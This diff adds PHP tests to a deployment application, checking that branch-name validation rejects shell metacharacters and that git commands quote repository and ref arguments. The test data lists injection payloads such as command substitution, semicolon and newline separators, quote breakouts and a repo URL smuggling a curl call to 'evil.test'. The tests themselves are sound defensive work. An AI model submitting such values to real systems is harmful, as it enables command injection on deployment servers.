@@ -1,6 +1,9 @@
 <?php
 
 use App\Jobs\ApplicationDeploymentJob;
+use App\Models\Application;
+use App\Models\ApplicationSetting;
+use App\Rules\ValidGitBranch;
 use App\Support\ValidationPatterns;
 
 describe('deployment job path field validation', function () {
@@ -127,6 +130,38 @@ describe('deployment job path field validation', function () {
 });
 
 describe('API validation rules for path fields', function () {
+    test('git_branch validation rejects shell metacharacters', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'backtick command substitution' => 'main`id`',
+        'dollar command substitution' => 'main$(id)',
+        'semicolon command separator' => 'main;id',
+        'ifs shell expansion' => 'main${IFS}id',
+        'space separator' => 'main branch',
+    ]);
+
+    test('git_branch validation allows safe branch names', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'main',
+        'feature/safe-branch',
+        'release_2026.06',
+    ]);
+
     test('dockerfile_location validation rejects shell metacharacters', function () {
         $rules = sharedDataApplications();
 
@@ -180,6 +215,68 @@ describe('API validation rules for path fields', function () {
         );
 
         expect($validator->fails())->toBeFalse();
+    });
+});
+
+describe('deployment git command escaping', function () {
+    test('ls-remote command shell-quotes repository and ref arguments', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        foreach ([
+            'customPort' => 22,
+            'fullRepoUrl' => "git@example.com:org/repo.git'; curl evil.test; #",
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('gitLsRemoteCommand');
+        $method->setAccessible(true);
+
+        $command = $method->invoke($instance, 'refs/heads/main`id`', '/root/.ssh/id_rsa');
+
+        expect($command)
+            ->toContain("git ls-remote 'git@example.com:org/repo.git'\\''; curl evil.test; #' 'refs/heads/main`id`'")
+            ->toContain('-i /root/.ssh/id_rsa')
+            ->not->toContain('repo.git; curl');
+    });
+
+    test('coolify branch shell assignment is quoted', function () {
+        $job = new ReflectionClass(ApplicationDeploymentJob::class);
+        $instance = $job->newInstanceWithoutConstructor();
+
+        $application = new Application;
+        $application->uuid = 'app-uuid';
+        $application->git_branch = 'main`id`';
+        $application->fqdn = null;
+        $application->compose_parsing_version = '3';
+
+        $settings = new ApplicationSetting;
+        $settings->include_source_commit_in_build = false;
+        $application->setRelation('settings', $settings);
+
+        foreach ([
+            'application' => $application,
+            'commit' => 'HEAD',
+            'pull_request_id' => 0,
+        ] as $property => $value) {
+            $reflectionProperty = $job->getProperty($property);
+            $reflectionProperty->setAccessible(true);
+            $reflectionProperty->setValue($instance, $value);
+        }
+
+        $method = $job->getMethod('set_coolify_variables');
+        $method->setAccessible(true);
+        $method->invoke($instance);
+
+        $coolifyVariables = $job->getProperty('coolify_variables');
+        $coolifyVariables->setAccessible(true);
+
+        expect($coolifyVariables->getValue($instance))
+            ->toContain("COOLIFY_BRANCH='main`id`' ")
+            ->toContain('COOLIFY_RESOURCE_UUID=app-uuid ');
     });
 });
 
@@ -977,4 +1074,47 @@ describe('install/build/start command rules survive array_merge in controller', 
         expect($merged['start_command'])->toBeArray();
         expect($merged['start_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
     });
+});
+
+describe('git_branch validation rules survive array_merge in controller', function () {
+    test('git_branch uses ValidGitBranch in shared application rules', function () {
+        $rules = sharedDataApplications();
+
+        expect($rules['git_branch'])->toBeArray();
+        expect(collect($rules['git_branch'])->contains(fn ($rule) => $rule instanceof ValidGitBranch))->toBeTrue();
+    });
+
+    test('git_branch rejects shell metacharacter payloads', function (string $payload) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $payload],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'semicolon command separator' => 'main;touch /tmp/pwned;#',
+        'command substitution' => 'main$(touch /tmp/pwned)',
+        'backtick substitution' => 'main`touch /tmp/pwned`',
+        'pipe operator' => 'main|id',
+        'newline injection' => "main\ntouch /tmp/pwned",
+        'redirect operator' => 'main>/tmp/pwned',
+        'single quote breakout' => "main';id;#",
+    ]);
+
+    test('git_branch accepts safe branch names', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'main',
+        'feature/my-branch',
+        'release_1.2.3',
+    ]);
 });
